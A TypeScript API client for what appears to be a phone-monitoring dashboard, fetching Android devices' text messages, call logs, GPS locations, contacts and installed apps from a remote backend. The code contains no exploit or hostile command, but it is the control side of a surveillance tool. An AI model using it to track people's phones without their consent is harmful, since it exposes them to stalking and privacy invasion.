import axios from 'axios';
import type { Device, Message, Call, Location, Contact, InstalledApp, PermissionStatus } from '../types';

// Production backend default with environment override
export const DEFAULT_PRODUCTION_API = 'https://backend-ttml.onrender.com/api';

export const getApiBaseUrl = (): string => {
  const envUrl = import.meta.env.VITE_API_BASE_URL;
  if (envUrl && envUrl.trim() !== '') {
    return envUrl.endsWith('/') ? envUrl.slice(0, -1) : envUrl;
  }
  // In the browser, always use relative /api so requests go through the dev server proxy,
  // avoiding cross-origin CORS blocks (such as on *.run.app)
  if (typeof window !== 'undefined') {
    return '/api';
  }
  return DEFAULT_PRODUCTION_API;
};

export const isMockModeActive = (): boolean => {
  if (import.meta.env.VITE_USE_MOCK === 'true') return true;
  if (typeof localStorage !== 'undefined') {
    return localStorage.getItem('dev_mock_mode') === 'true';
  }
  return false;
};

export const setMockMode = (enabled: boolean) => {
  if (typeof window !== 'undefined') {
    localStorage.setItem('dev_mock_mode', enabled ? 'true' : 'false');
    window.location.reload();
  }
};

const getAuthToken = () => {
  return localStorage.getItem('auth_token');
};

const api = axios.create();

api.interceptors.request.use((config) => {
  config.baseURL = getApiBaseUrl();
  const token = getAuthToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  if (isMockModeActive()) {
    config.headers['x-mock-mode'] = 'true';
  }
  return config;
});

api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response && error.response.status === 401) {
      // Clear token and redirect to login if unauthorized
      localStorage.removeItem('auth_token');
      localStorage.removeItem('auth_user');
      if (typeof window !== 'undefined' && window.location.pathname !== '/login') {
        window.location.href = '/login';
      }
    }
    return Promise.reject(error);
  }
);

interface ApiDevice {
  id: string;
  name: string;
  model: string;
  android_version: string;
  app_version: string;
  last_seen: string;
  is_online: number;
  battery_level: number;
  is_charging: number;
  network_type: string;
}

interface ApiMessage {
  id: string;
  device_id: string;
  sender: string;
  content: string;
  type: string;
  timestamp: string;
}

interface ApiCall {
  id: string;
  device_id: string;
  number: string;
  type: string;
  duration: number;
  timestamp: string;
}

interface ApiLocation {
  id: string;
  device_id: string;
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: string;
}

interface ApiContact {
  id: string;
  device_id: string;
  name: string;
  phone_number: string;
}

interface ApiApp {
  id: string;
  device_id: string;
  app_name: string;
  package_name: string;
  version_name: string;
}

export const apiClient = {
  login: async (username: string, password: string) => {
    const response = await api.post('/auth/login', { username, password });
    return response.data;
  },

  register: async (username: string, password: string) => {
    const response = await api.post('/auth/register', { username, password });
    return response.data;
  },

  getDevices: async (): Promise<Device[]> => {
    const response = await api.get('/devices');
    const items = response.data?.data || [];
    return items.map((d: ApiDevice) => ({
      id: d.id,
      name: d.name,
      model: d.model || 'Unknown Model',
      androidVersion: d.android_version || 'Android',
      appVersion: d.app_version || '1.0',
      lastSeen: d.last_seen,
      isOnline: Boolean(d.is_online),
      batteryLevel: d.battery_level ?? 0,
      isCharging: Boolean(d.is_charging),
      networkType: d.network_type || 'Unknown'
    }));
  },

  getDevice: async (id: string): Promise<Device | undefined> => {
    const response = await api.get(`/devices/${id}`);
    const d: ApiDevice = response.data?.data;
    if (!d) return undefined;
    return {
      id: d.id,
      name: d.name,
      model: d.model || 'Unknown Model',
      androidVersion: d.android_version || 'Android',
      appVersion: d.app_version || '1.0',
      lastSeen: d.last_seen,
      isOnline: Boolean(d.is_online),
      batteryLevel: d.battery_level ?? 0,
      isCharging: Boolean(d.is_charging),
      networkType: d.network_type || 'Unknown'
    };
  },

  deleteDevice: async (id: string): Promise<void> => {
    await api.delete(`/devices/${id}`);
  },

  getMessages: async (deviceId?: string): Promise<Message[]> => {
    const url = deviceId ? `/messages?deviceId=${encodeURIComponent(deviceId)}` : '/messages';
    const response = await api.get(url);
    const items = response.data?.data || [];
    return items.map((m: ApiMessage) => ({
      id: m.id,
      deviceId: m.device_id,
      sender: m.sender,
      content: m.content,
      type: m.type,
      timestamp: m.timestamp
    }));
  },

  deleteMessage: async (id: string): Promise<void> => {
    await api.delete(`/messages/${id}`);
  },

  getCalls: async (deviceId?: string): Promise<Call[]> => {
    const url = deviceId ? `/calls?deviceId=${encodeURIComponent(deviceId)}` : '/calls';
    const response = await api.get(url);
    const items = response.data?.data || [];
    return items.map((c: ApiCall) => ({
      id: c.id,
      deviceId: c.device_id,
      number: c.number,
      type: c.type,
      duration: c.duration,
      timestamp: c.timestamp
    }));
  },

  getLocations: async (deviceId?: string): Promise<Location[]> => {
    const url = deviceId ? `/locations?deviceId=${encodeURIComponent(deviceId)}` : '/locations';
    const response = await api.get(url);
    const items = response.data?.data || [];
    return items.map((l: ApiLocation) => ({
      id: l.id,
      deviceId: l.device_id,
      latitude: Number(l.latitude),
      longitude: Number(l.longitude),
      accuracy: Number(l.accuracy || 0),
      timestamp: l.timestamp
    }));
  },

  getContacts: async (deviceId?: string): Promise<Contact[]> => {
    const url = deviceId ? `/contacts?deviceId=${encodeURIComponent(deviceId)}` : '/contacts';
    const response = await api.get(url);
    const items = response.data?.data || [];
    return items.map((c: ApiContact) => ({
      id: c.id,
      deviceId: c.device_id,
      name: c.name,
      phoneNumber: c.phone_number
    }));
  },

  getApps: async (deviceId?: string): Promise<InstalledApp[]> => {
    const url = deviceId ? `/apps?deviceId=${encodeURIComponent(deviceId)}` : '/apps';
    const response = await api.get(url);
    const items = response.data?.data || [];
    return items.map((a: ApiApp) => ({
      id: a.id,
      deviceId: a.device_id,
      appName: a.app_name,
      packageName: a.package_name,
      versionName: a.version_name || 'Unknown'
    }));
  },

  getPermissions: async (_deviceId?: string): Promise<PermissionStatus[]> => {
    return [];
  },
};
